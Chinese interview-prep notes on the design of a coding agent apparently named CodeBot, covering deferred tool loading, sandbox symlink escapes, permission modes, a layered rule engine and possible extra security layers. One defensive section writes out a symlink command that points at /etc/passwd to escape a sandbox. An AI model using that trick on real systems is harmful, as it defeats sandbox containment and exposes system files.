
### 10.4 "延迟加载是怎么省 context window 的？"

Context Window 有限（如 20 万 token），每个工具的 Schema 占用几百 token。20 个全注册就是几千 token 没了。

延迟加载让低频工具（TaskCreate、TeamCreate、EnterWorktree）不在初始列表里。LLM 需要时先调 ToolSearch 找到 Schema，之后该工具自动加入列表。就像按需加载，不常看的不放桌面。

**节省效果**：初始上下文少占 6000 token，相当于多读 3-4 个文件的空间。

**追问：ToolSearch 怎么找到工具的？**

关键词搜索：搜 "team" → 匹配名称含 "team" 的工具给高分 → 匹配描述含 "team" 的给中等分 → 按分数排序返回。支持 `select:ToolName` 精确选择。

**为什么不上语义搜索？** YAGNI 原则——工具数量少（20+ 个），关键词足够，不需要引入 embedding 模型增加复杂度。

### 10.5 "沙箱怎么防止符号链接越狱？"

攻击场景：在项目目录建 `ln -s /etc/passwd ./escape`，Agent 读 `./escape` 实际读到 `/etc/passwd`。

解法：`Path.resolve(strict=True)` 解析所有符号链接成真实路径，再检查是否在允许目录内。

**追问：写文件时目标路径不存在怎么办？**

`resolve(strict=True)` 会报错。CodeBot 找到最近的存在的祖先目录，解析它，再拼上剩余路径。这样即使路径不存在，也能正确判断它"将来会落在哪个目录下"。

### 10.6 "权限模式为什么是 6 种不是 4 种？"

4 种是用户常看到的（default/acceptEdits/plan/bypass），还有 2 种是：
- `custom`：全部 ask（比 default 更严格，读也要确认）
- `dontAsk`：全部 allow（bypass 的别名，历史遗留）

**追问：为什么 custom 模式连读都要问？**

适用于高敏感场景——比如处理密钥文件时，连读操作都要审计。这是"安全优先于效率"的极致体现。

### 10.7 "规则引擎为什么要三层？"

让团队和个人都能自定义规则：
- user 层：用户全局规则（如"所有项目禁止 rm"）
- project 层：项目级规则（团队共享，提交 Git）
- local 层：个人临时规则（不提交 Git）

**追问：三层规则的优先级？**

每层内"后定义的优先"（倒序遍历），层间是"user → project → local"。但只要任一层匹配就返回，不继续往下——所以实际是"先匹配的层优先"。

### 10.8 "如果让你加一个新的安全层，会加什么？"

参考答案：

1. **行为分析层**：统计 Agent 的操作模式，异常时拦截（如短时间内大量删文件）
2. **资源限制层**：限制 Agent 的 CPU/内存/磁盘使用，防止资源耗尽
3. **审计日志层**：所有操作写入审计日志，支持事后追溯
4. **沙箱执行层**：Bash 命令在 Docker/namespace 沙箱里执行，而非直接在主机
5. **网络隔离层**：限制 Agent 的网络访问，防止数据外泄

**这是开放题，展示你的安全思维。**

---

> **下一步**：阶段4深入对话管理、上下文压缩和记忆系统。
